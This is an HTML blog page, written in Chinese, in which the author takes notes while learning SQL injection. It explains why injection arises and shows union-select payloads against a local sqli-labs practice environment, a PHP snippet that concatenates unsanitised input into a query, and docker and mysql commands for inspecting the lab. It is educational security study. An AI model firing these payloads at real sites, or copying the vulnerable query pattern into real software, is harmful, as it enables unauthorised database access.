@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next pisces" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.2" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.4.2',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="SQL注入原理分析SQL注入背景介绍-SQL语言介绍sql 结构化查询语言通用的功能极强的关系数据库标准语言功能包括查询、操纵、定义和控制四个方面不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么  SQL注入产生原因网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。    B/S建立在互联网，对安">
+<meta name="keywords" content="sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="1.1.1-SQL注入-SQL注入基础-SQL注入原理分析">
+<meta property="og:url" content="http://tea9.coding.me/2018/06/11/2018-06-11-web_security_learn01_1_3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL注入原理分析SQL注入背景介绍-SQL语言介绍sql 结构化查询语言通用的功能极强的关系数据库标准语言功能包括查询、操纵、定义和控制四个方面不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么  SQL注入产生原因网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。    B/S建立在互联网，对安">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-07-15T11:55:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="1.1.1-SQL注入-SQL注入基础-SQL注入原理分析">
+<meta name="twitter:description" content="SQL注入原理分析SQL注入背景介绍-SQL语言介绍sql 结构化查询语言通用的功能极强的关系数据库标准语言功能包括查询、操纵、定义和控制四个方面不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么  SQL注入产生原因网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。    B/S建立在互联网，对安">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="http://tea9.coding.me/2018/06/11/2018-06-11-web_security_learn01_1_3/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>1.1.1-SQL注入-SQL注入基础-SQL注入原理分析 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://tea9.coding.me/2018/06/11/2018-06-11-web_security_learn01_1_3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tea9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">1.1.1-SQL注入-SQL注入基础-SQL注入原理分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-06-11 00:00:00" itemprop="dateCreated datePublished" datetime="2018-06-11T00:00:00+08:00">2018-06-11</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-07-15 19:55:32" itemprop="dateModified" datetime="2018-07-15T19:55:32+08:00">2018-07-15</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="SQL注入原理分析"><a href="#SQL注入原理分析" class="headerlink" title="SQL注入原理分析"></a>SQL注入原理分析</h2><h3 id="SQL注入背景介绍-SQL语言介绍"><a href="#SQL注入背景介绍-SQL语言介绍" class="headerlink" title="SQL注入背景介绍-SQL语言介绍"></a>SQL注入背景介绍-SQL语言介绍</h3><p>sql 结构化查询语言<br>通用的功能极强的关系数据库标准语言<br>功能包括查询、操纵、定义和控制四个方面<br>不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么 </p>
+<h3 id="SQL注入产生原因"><a href="#SQL注入产生原因" class="headerlink" title="SQL注入产生原因"></a>SQL注入产生原因</h3><p>网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。  </p>
+<ol>
+<li>B/S建立在互联网，对安全控制能力较弱</li>
+<li>开发人员水平和经验参差不齐，没有在编写代码时对用户的输入数据或者页面携带信息进行必要的合法性判断。  </li>
+</ol>
+<p>攻击者利用这个机会<strong>提交一段数据库查询代码</strong>，根据程序返回的结果，就可以获得一些数据库信息。</p>
+<h3 id="SQL注入核心原理"><a href="#SQL注入核心原理" class="headerlink" title="SQL注入核心原理"></a>SQL注入核心原理</h3><p>SQL注入是一种将恶意的SQL代码<strong>插入或添加到应用（用户）的输入参数</strong>的攻击，攻击者探测出开发者编程过程中的漏洞，利用这些漏洞，巧妙的<strong>构造SQL语句</strong>对数据库系统的内容进行直接<strong>检索或修改</strong>。</p>
+<p>灵活的SQL查询语句+用户输入的数据带入了SQL语句=用户直接操作数据库-&gt;<strong>SQL注入漏洞</strong></p>
+<pre><code>select version();
+select id from where id=1;
+select id from jobs where id=1 union select version();
+
+select id.location from jobs where id=1 union select 1,version();  // 1是占位
+</code></pre><p>用户输入可控，代码对用户输入进行了拼接，带入SQL语句，产生SQL注入漏洞</p>
+<p><a href="http://test.com/index.php?id=1*UNION" target="_blank" rel="noopener">http://test.com/index.php?id=1*UNION</a> SELECT 1,version()#*</p>
+<pre><code>$id=$_GET[&apos;id&apos;];// id没做处理
+$sql=&quot;SELECT * FROM users WHEre id=&apos;$id&apos; LIMIT 0,1&quot;
+
+select id,location from jobs where id=1 union select 1,version()#
+</code></pre><p><br></p>
+<pre><code>docker ps --help
+docker ps -a
+docker exec -it &lt;id&gt; /bin/bash
+mysql
+show databases;
+use security;
+show tables;
+
+select * from users;
+select username from users where id=1;
+select username,password from users where id=1;
+
+select 1;
+select 1123;
+select version();
+select username,password from users where id=1 union select version();
+select username,password from users where id=1 union select 1,version();
+
+select * from users where id=1 limit 0,1;
+select * from users where id=-1 union select 1,2,version()# limit 0,1;
+
+// 浏览器
+http://127.0.0.1:90/Less-1/?id=1%27%20union%20select%201,2,3%23
+?id=1&apos; union select 1,2,3
+// %23 #
+
+http://127.0.0.1:90/Less-1/?id=-1%27%20union%20select%201,version(),3%23
+?id=-1&apos; union select 1,version(),3
+// 需要让它出个错
+
+// 控制台
+// 退出mysql
+exit
+
+cd /var/www/html/Less-1
+cat index.php
+vi index.php
+// 编辑
+echo $sql
+:wq
+</code></pre><p>todo sqli-labs源码地址</p>
+<pre><code>docker ps -a
+docker exec -it &lt;id&gt; /bin/bash
+cd /var/www/html/Less-1
+</code></pre>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>Donate comment here</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="tea9 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="tea9 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/11/2018-06-11-web_security_learn01_1_2/" rel="next" title="1.1.1-SQL注入-SQL注入基础-SQL注入练习环境搭建">
+                <i class="fa fa-chevron-left"></i> 1.1.1-SQL注入-SQL注入基础-SQL注入练习环境搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/11/2018-06-11-web_security_learn01_1_6/" rel="prev" title="1.1.1-SQL注入-SQL注入基础-SQL手工注入方法">
+                1.1.1-SQL注入-SQL注入基础-SQL手工注入方法 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">tea9</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">65</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">20</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">40</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/tea9" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入原理分析"><span class="nav-number">1.</span> <span class="nav-text">SQL注入原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入背景介绍-SQL语言介绍"><span class="nav-number">1.1.</span> <span class="nav-text">SQL注入背景介绍-SQL语言介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入产生原因"><span class="nav-number">1.2.</span> <span class="nav-text">SQL注入产生原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入核心原理"><span class="nav-number">1.3.</span> <span class="nav-text">SQL注入核心原理</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tea9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.4.2</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
